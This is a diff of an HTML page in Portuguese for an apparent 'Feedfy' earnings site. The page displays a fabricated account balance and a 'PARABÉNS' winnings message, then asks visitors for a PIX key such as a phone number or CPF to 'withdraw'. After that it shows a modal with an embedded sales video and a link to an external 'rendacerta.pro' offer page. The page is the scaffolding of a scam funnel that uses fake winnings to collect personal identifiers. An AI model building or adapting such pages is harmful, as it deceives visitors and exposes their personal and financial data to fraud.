@@ -9,27 +9,135 @@
     <link rel="stylesheet" href="css/style.css">
     <script src="js/021532d534.js" crossorigin="anonymous"></script>
     <title>Feedfy</title>
+    <script>
+    
+        var pixtype = '';
+         function formatar(mascara, documento) {
+        let i = documento.value.length;
+        let saida = '#';
+        let texto = mascara.substring(i);
+        while (texto.substring(0, 1) != saida && texto.length ) {
+          documento.value += texto.substring(0, 1);
+          i++;
+          texto = mascara.substring(i);
+        }
+    }
+    function gerarPix() {
+            if ($('.phone').val().length > 4 || $('.cpf').val().length > 4) {
+                $('#checkout').removeClass('d-none');
+                var playerDiv = '<div id="vid_663015f6ef68be000c95679b" style="position:relative;width:100%;padding:56.25% 0 0;">' +
+        '<img id="thumb_663015f6ef68be000c95679b" src="https://images.converteai.net/e41c52c0-1591-4eaf-8d8f-6bb645a4e0b7/players/663015f6ef68be000c95679b/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;">' +
+        '<div id="backdrop_663015f6ef68be000c95679b" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div>' +
+        '</div>';
+    
+    var script = '<script type="text/javascript" id="scr_663015f6ef68be000c95679b">' +
+        'var s=document.createElement("script");' +
+        's.src="https://scripts.converteai.net/e41c52c0-1591-4eaf-8d8f-6bb645a4e0b7/players/663015f6ef68be000c95679b/player.js";' +
+        's.async=true;' +
+        'document.head.appendChild(s);';
+        $('.vtub').html(playerDiv + script);
+                } else {
+                  alert('Preencha o pix')
+                }
+          }
+        $(document).ready(function() {
+    
+          if (localStorage.getItem('completed')) {
+            $("#saldo-valor").html('1.217,00')
+          } else {
+            $("#saldo-valor").html('224,00')
+          }
+            $('.option').click(function() {
+                $('.option').removeClass('selected');
+                $(this).addClass("selected");
+                    option = $(this).attr('id');
+                    console.log(option);
+    
+                    if (option == 'phone') {
+                      pixtype = 'phoneNumber'
+                    $('.phone').removeClass('d-none');
+                    $('.cpf').addClass('d-none');
+                    $('.email').addClass('d-none');
+    
+                } else if (option == 'cpf') {
+                  pixtype = 'document'
+    
+                    $('.cpf').removeClass('d-none');
+                    $('.phone').addClass('d-none');
+                    $('.email').addClass('d-none');
+    
+                }
+                });
+        });
+      </script>
   </head>
-  <body class="parabens">
+  <body>
+    <div class="header">
+        <img src="images/logo2.png" alt="">
+        <div class="saldo">
+          <h5>Saldo</h5>
+          <p>R$ <span id="saldo">574,46</span></p>
+        </div>
+      </div>
     <div class="container">
-        <img src="images/certo.png" style="padding-top: 20vh; width: 70px; margin: 0 auto;" alt="">
-        <h1>PARABÉNS!</h1>
-        <h3 style="font-size: 24px; font-weight: 500 !important; margin: 30px 0px;">Seu cadastro foi realizado e você acaba de ganhar <b>R$ 574,46</b></h3>
-        <h4 style="font-size: 18px; font-weight: 500 !important;">Cadastre seu pix para realizar o seu primeiro <b>SAQUE</b></h4>
-        <button class="btn-white" onclick="window.location.href='saque.html'">Continuar</button>
+        <section class="conteudo">
+            <section class="box">
+                <div class="badge" style="display: flex; flex-direction: column; gap: 10px;">
+                  <span style="color: black; font-size: 16px;">Antes de realizar seu 1º saque CADASTRE SUA CHAVE PIX.</span>
+                </div>
+                <div class="saque">
+    
+                    <p style="font-size: 13px; text-align: center; margin: 35px 0px 10px 0px;">
+                        <i class="fa-brands fa-pix" style="color: rgb(71, 185, 128);" aria-hidden="true"></i>
+                        Selecione sua chave PIX
+                    </p>
+                    <div class="wrapperOption">
+                        <div class="option selected" id="phone">
+                          <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#e8eaed"><path d="M280-40q-33 0-56.5-23.5T200-120v-720q0-33 23.5-56.5T280-920h400q33 0 56.5 23.5T760-840v720q0 33-23.5 56.5T680-40H280Zm0-120v40h400v-40H280Zm0-80h400v-480H280v480Zm0-560h400v-40H280v40Zm0 0v-40 40Zm0 640v40-40Z"></path></svg>                        Celular
+                        </div>
+        
+                        <div class="option" id="cpf">
+                          <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#e8eaed"><path d="M160-80q-33 0-56.5-23.5T80-160v-440q0-33 23.5-56.5T160-680h200v-120q0-33 23.5-56.5T440-880h80q33 0 56.5 23.5T600-800v120h200q33 0 56.5 23.5T880-600v440q0 33-23.5 56.5T800-80H160Zm0-80h640v-440H600q0 33-23.5 56.5T520-520h-80q-33 0-56.5-23.5T360-600H160v440Zm80-80h240v-18q0-17-9.5-31.5T444-312q-20-9-40.5-13.5T360-330q-23 0-43.5 4.5T276-312q-17 8-26.5 22.5T240-258v18Zm320-60h160v-60H560v60Zm-200-60q25 0 42.5-17.5T420-420q0-25-17.5-42.5T360-480q-25 0-42.5 17.5T300-420q0 25 17.5 42.5T360-360Zm200-60h160v-60H560v60ZM440-600h80v-200h-80v200Zm40 220Z"></path></svg>                        CPF
+                        </div>
+        
+                        
+                    </div>
+                    <input class="pix phone " type="tel" placeholder="Digite seu número aqui..." onkeypress="formatar('(##) #####-####',this)" maxlength="15">
+                    <input class="pix cpf d-none" placeholder="Digite seu CPF aqui..." onkeypress="formatar('###.###.###-##',this)" maxlength="14">
+                    <input class="pix email d-none" placeholder="Digite seu E-mail aqui...">
+        
+                    <button class="btnPulsing" onclick="gerarPix();">REALIZAR SAQUE</button>
+                </div>
+            </section>
+          </section>
     </div>
     <div class="footer">
         <div class="d-flex">
             <div class="item">
-                <svg xmlns="http://www.w3.org/2000/svg" width="35" height="35" fill="none" viewBox="0 0 24 24" id="chat-round-money"><path fill="url(#paint0_linear_2461_19681)" fill-rule="evenodd" d="M12 2.75C6.89137 2.75 2.75 6.89137 2.75 12C2.75 13.4811 3.09753 14.8788 3.7148 16.1181C3.96254 16.6155 4.05794 17.2103 3.90163 17.7945L3.30602 20.0205C3.19663 20.4293 3.57066 20.8034 3.97949 20.694L6.20553 20.0984C6.78973 19.9421 7.38451 20.0375 7.88191 20.2852C9.12121 20.9025 10.5189 21.25 12 21.25C17.1086 21.25 21.25 17.1086 21.25 12C21.25 6.89137 17.1086 2.75 12 2.75ZM1.25 12C1.25 6.06294 6.06294 1.25 12 1.25C17.9371 1.25 22.75 6.06294 22.75 12C22.75 17.9371 17.9371 22.75 12 22.75C10.2817 22.75 8.65552 22.3463 7.21315 21.6279C6.99791 21.5207 6.77814 21.4979 6.59324 21.5474L4.3672 22.143C2.84337 22.5507 1.44927 21.1566 1.857 19.6328L2.4526 17.4068C2.50208 17.2219 2.47933 17.0021 2.37213 16.7869C1.65371 15.3445 1.25 13.7183 1.25 12ZM12 7.25C12.4142 7.25 12.75 7.58579 12.75 8V8.01023C13.8388 8.28454 14.75 9.143 14.75 10.3333C14.75 10.7475 14.4142 11.0833 14 11.0833C13.5858 11.0833 13.25 10.7475 13.25 10.3333C13.25 9.9493 12.8242 9.41667 12 9.41667C11.1758 9.41667 10.75 9.9493 10.75 10.3333C10.75 10.7174 11.1758 11.25 12 11.25C13.3849 11.25 14.75 12.2098 14.75 13.6667C14.75 14.857 13.8388 15.7155 12.75 15.9898V16C12.75 16.4142 12.4142 16.75 12 16.75C11.5858 16.75 11.25 16.4142 11.25 16V15.9898C10.1612 15.7155 9.25 14.857 9.25 13.6667C9.25 13.2525 9.58579 12.9167 10 12.9167C10.4142 12.9167 10.75 13.2525 10.75 13.6667C10.75 14.0507 11.1758 14.5833 12 14.5833C12.8242 14.5833 13.25 14.0507 13.25 13.6667C13.25 13.2826 12.8242 12.75 12 12.75C10.6151 12.75 9.25 11.7903 9.25 10.3333C9.25 9.143 10.1612 8.28454 11.25 8.01023V8C11.25 7.58579 11.5858 7.25 12 7.25Z" clip-rule="evenodd"></path><defs><linearGradient id="paint0_linear_2461_19681" x1="12" x2="12" y1="1.25" y2="22.75" gradientUnits="userSpaceOnUse"><stop stop-color="#854D9C"></stop><stop offset="1" stop-color="#CD4ED3"></stop></linearGradient></defs></svg>	
+                <svg xmlns="http://www.w3.org/2000/svg" width="35" height="35" fill="none" viewBox="0 0 24 24" id="chat-round-money"><path fill="grey" fill-rule="evenodd" d="M12 2.75C6.89137 2.75 2.75 6.89137 2.75 12C2.75 13.4811 3.09753 14.8788 3.7148 16.1181C3.96254 16.6155 4.05794 17.2103 3.90163 17.7945L3.30602 20.0205C3.19663 20.4293 3.57066 20.8034 3.97949 20.694L6.20553 20.0984C6.78973 19.9421 7.38451 20.0375 7.88191 20.2852C9.12121 20.9025 10.5189 21.25 12 21.25C17.1086 21.25 21.25 17.1086 21.25 12C21.25 6.89137 17.1086 2.75 12 2.75ZM1.25 12C1.25 6.06294 6.06294 1.25 12 1.25C17.9371 1.25 22.75 6.06294 22.75 12C22.75 17.9371 17.9371 22.75 12 22.75C10.2817 22.75 8.65552 22.3463 7.21315 21.6279C6.99791 21.5207 6.77814 21.4979 6.59324 21.5474L4.3672 22.143C2.84337 22.5507 1.44927 21.1566 1.857 19.6328L2.4526 17.4068C2.50208 17.2219 2.47933 17.0021 2.37213 16.7869C1.65371 15.3445 1.25 13.7183 1.25 12ZM12 7.25C12.4142 7.25 12.75 7.58579 12.75 8V8.01023C13.8388 8.28454 14.75 9.143 14.75 10.3333C14.75 10.7475 14.4142 11.0833 14 11.0833C13.5858 11.0833 13.25 10.7475 13.25 10.3333C13.25 9.9493 12.8242 9.41667 12 9.41667C11.1758 9.41667 10.75 9.9493 10.75 10.3333C10.75 10.7174 11.1758 11.25 12 11.25C13.3849 11.25 14.75 12.2098 14.75 13.6667C14.75 14.857 13.8388 15.7155 12.75 15.9898V16C12.75 16.4142 12.4142 16.75 12 16.75C11.5858 16.75 11.25 16.4142 11.25 16V15.9898C10.1612 15.7155 9.25 14.857 9.25 13.6667C9.25 13.2525 9.58579 12.9167 10 12.9167C10.4142 12.9167 10.75 13.2525 10.75 13.6667C10.75 14.0507 11.1758 14.5833 12 14.5833C12.8242 14.5833 13.25 14.0507 13.25 13.6667C13.25 13.2826 12.8242 12.75 12 12.75C10.6151 12.75 9.25 11.7903 9.25 10.3333C9.25 9.143 10.1612 8.28454 11.25 8.01023V8C11.25 7.58579 11.5858 7.25 12 7.25Z" clip-rule="evenodd"></path><defs><linearGradient id="paint0_linear_2461_19681" x1="12" x2="12" y1="1.25" y2="22.75" gradientUnits="userSpaceOnUse"><stop stop-color="grey"></stop><stop offset="1" stop-color="#fff"></stop></linearGradient></defs></svg>	
             </div>
             <div class="item" onclick="window.location.href='www.comprar.com'" "="">
                 <i style="color: rgb(206, 206, 206);" class="fa-solid fa-chart-line"></i>
             </div>
             <div class="item">
-                <i style="color: rgb(206, 206, 206);" class="fa-brands fa-pix"></i>
+                <i style="color: rgb(147, 92, 192);" class="fa-brands fa-pix"></i>
             </div>
         </div>
     </div>
+    <div id="checkout" class="modal d-none">
+      <div class="modal-content">
+        <div class="container" style="color: black;">
+          <h2 style="color: red; font-size: 25px;">PARABÉNS!</h2>
+          <h3 style="font-weight: 500; font-size: 19px; margin: 10px 5px;">Para continuar lucrando e finalizar seu saque de <b style="color: #9D52F4;">R$ 574,46 + Bônus</b></h3>
+          <h3 style="font-weight: 500; font-size: 19px; margin: 10px 5px;">Assista um pequeno Video onde mostro como sacar.</h3>
+
+          <div class="card" style="border: 1px solid black; font-size: 18px; padding: 10px;">
+            <h3 style="font-size: 15px; margin: 0px;">Fique tranquilo, não vou tomar o seu tempo <b style="color: #9D52F4;">o video tem apenas 3 Minutos</b></h3>
+          </div>
+          <button class="btn-pop-out-foto" style="border: 0px;" onclick="window.location.href = 'https://feedfyacesso.rendacerta.pro/'">CONCLUIR CADASTRO E SACAR</button>
+        </div>
+      </div>
+    </div>
+    
   
   </body></html>
